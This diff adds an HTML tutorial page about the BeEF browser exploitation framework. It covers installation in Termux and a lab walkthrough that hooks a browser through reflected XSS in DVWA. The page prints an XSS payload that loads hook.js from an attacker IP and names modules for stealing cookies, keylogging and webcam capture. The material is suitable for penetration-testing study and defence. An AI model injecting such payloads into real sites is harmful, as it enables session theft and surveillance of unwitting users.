@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <title>Anonymous Archives - BeEF (Browser Exploitation Framework)</title>
+  <!-- Paste the full <style> block from index.html here, including .binary-bg and animation keyframes for the upward-moving blue binary pattern -->
+</head>
+<body>
+  <div class="binary-bg"></div>
+  <!-- Navigation bar identical to other pages -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="index.html">Anonymous Archives</a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav">
+          <li class="nav-item"><a class="nav-link" href="index.html">Home</a></li>
+          <li class="nav-item"><a class="nav-link" href="education.html">Educational Resources</a></li>
+          <li class="nav-item"><a class="nav-link active" href="tools.html">Tools and Software</a></li>
+          <!-- Include remaining navigation items as in previous pages -->
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container mt-4">
+    <section id="tool-beef">
+      <h2>BeEF (Browser Exploitation Framework)</h2>
+      <p>BeEF (Browser Exploitation Framework) is an open-source penetration testing tool developed by Wade Alcorn and maintained by the BeEF project community. It focuses on client-side attacks by "hooking" web browsers through cross-site scripting (XSS), malicious links, or social engineering vectors. Once a browser is hooked, BeEF provides a powerful command-and-control interface to execute JavaScript modules, fingerprint the browser/environment, steal session cookies, access WebRTC/camera/microphone (with permission), perform keylogging, exploit browser vulnerabilities, and demonstrate the impact of client-side compromise. BeEF is widely used in authorized red team engagements to evaluate browser security, XSS impact, and user interaction with malicious content.</p>
+      <img src="https://beefproject.com/static/images/beef-ui-zombie-list.png" alt="BeEF Web UI – Hooked Browsers (Zombie List)" class="img-fluid">
+      <h3>Uses</h3>
+      <p>BeEF is employed in ethical penetration testing to simulate real-world browser-based attacks, assess the effectiveness of XSS mitigations, demonstrate the dangers of reflected/stored XSS, and evaluate endpoint/user awareness. Example: Hooking a test browser via an injected XSS payload in a vulnerable web application, then using BeEF modules to extract session tokens, capture keystrokes, or deliver further payloads in a controlled lab environment.</p>
+      <h3>Installation in Termux</h3>
+      <p>BeEF is Ruby-based and runs as a web server. It installs cleanly in Termux with Ruby, Bundler, and network dependencies. Steps:</p>
+      <pre><code>pkg update && pkg upgrade -y
+pkg install git ruby build-essential libsqlite-dev libreadline-dev libssl-dev -y
+gem install bundler
+git clone https://github.com/beefproject/beef.git
+cd beef
+bundle install
+# Optional: Edit config.yaml (default bind to 0.0.0.0:3000, change hook URL if needed)
+# Launch: ./beef
+# Access UI: http://localhost:3000/ui/panel (or your Termux IP:3000 from another device)</code></pre>
+      <p>Common issues: Port 3000 blocked—edit config.yaml to use another port; Ruby gem errors—run bundle update or install missing native extensions; external hooking—ensure Termux device IP is reachable on the network. To uninstall: Remove the beef directory. For production testing, use a Linux VM or desktop for stability and better network reachability.</p>
+      <h3>Functions and Walkthroughs</h3>
+      <p>Start BeEF: <code>./beef</code>. Access control panel at http://<your-ip>:3000/ui/panel (default credentials: beef/beef). Hook a browser: Include the hook.js script in a vulnerable page (<script src="http://<beef-ip>:3000/hook.js"></script>) or send a malicious link. Once hooked, the browser appears as a "zombie" in the UI. Execute modules: Right-click zombie → Commands → Select category (Browser, Social Engineering, Exploits, etc.) → Choose module (e.g., Get Cookie, Keylogger, Webcam Snap). Monitor results in real time. Always test in isolated labs with explicit permission.</p>
+      <img src="https://beefproject.com/static/images/beef-ui-command-module.png" alt="BeEF Command Module Execution Interface" class="img-fluid">
+
+      <h3>Detailed Tutorial: Browser Hooking via Reflected XSS (Ethical Lab Scenario)</h3>
+      <p>This tutorial demonstrates using BeEF to hook a browser via a reflected XSS vulnerability in a deliberately vulnerable test application (e.g., DVWA, bWAPP, or a custom lab page you own). This procedure is permitted only in authorized environments with explicit written permission. Unauthorized XSS exploitation or browser hooking is illegal.</p>
+      <ol>
+        <li>Start BeEF server: In Termux, navigate to the beef directory and run <code>./beef</code>. Note the hook URL (e.g., http://192.168.1.50:3000/hook.js) and UI access (http://192.168.1.50:3000/ui/panel).</li>
+        <li>Prepare vulnerable target: Deploy a test application with a reflected XSS vulnerability (e.g., DVWA set to Low security → XSS (Reflected) page). Confirm the parameter (e.g., ?name=) reflects input unsanitized.</li>
+        <li>Craft XSS payload: Use a simple script tag that loads BeEF hook:
+          <code><script src="http://192.168.1.50:3000/hook.js"></script></code>
+          URL example: http://target-ip/dvwa/vulnerabilities/xss_r/?name=<script src="http://192.168.1.50:3000/hook.js"></code></li>
+        <li>Trigger the hook: Open the crafted URL in a test browser (preferably a virtual machine or isolated profile). If successful, BeEF UI shows a new hooked zombie under Online Browsers.</li>
+        <li>Interact with hooked browser: In BeEF UI, select the zombie → Commands tab → Social Engineering → Fake Notification Bar (or Browser → Get Cookie, Keylogger, Man Left in Browser, etc.). Execute the module and observe results in the Command Results tab.</li>
+        <li>Execute advanced actions (lab only): Try modules such as Webcam Snap (requests permission), Get Clipboard, or Browser Details to gather fingerprint information (user agent, plugins, screen resolution, etc.).</li>
+        <li>Stop and document: Close the browser tab to unhook or kill BeEF process (Ctrl+C). Document the attack chain, captured data (if any), and recommend mitigations: Content Security Policy (CSP), input/output encoding, HttpOnly/Secure cookies, X-XSS-Protection, and user awareness training.</li>
+      </ol>
+      <p>Expected results: Successful browser hook within seconds of loading the XSS payload, followed by real-time command execution and information retrieval from the test browser. Common issues: Browser blocking hook.js (CSP, adblockers)—disable protections in lab; network reachability—ensure attacker IP is accessible from victim; HTTPS mismatch—use HTTP for lab simplicity or configure SSL in BeEF.</p>
+      <img src="https://beefproject.com/static/images/beef-ui-zombie-details.png" alt="BeEF Hooked Browser Details View" class="img-fluid">
+      <p>For authoritative reference, consult the official resources: <a href="https://github.com/beefproject/beef" target="_blank">BeEF GitHub Repository</a>, <a href="https://beefproject.com/" target="_blank">BeEF Project Website</a>, <a href="https://github.com/beefproject/beef/wiki" target="_blank">BeEF Wiki (Installation, Modules, Usage)</a>, and <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger Web Security Academy – XSS Labs (complementary practice)</a>.</p>
+    </section>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
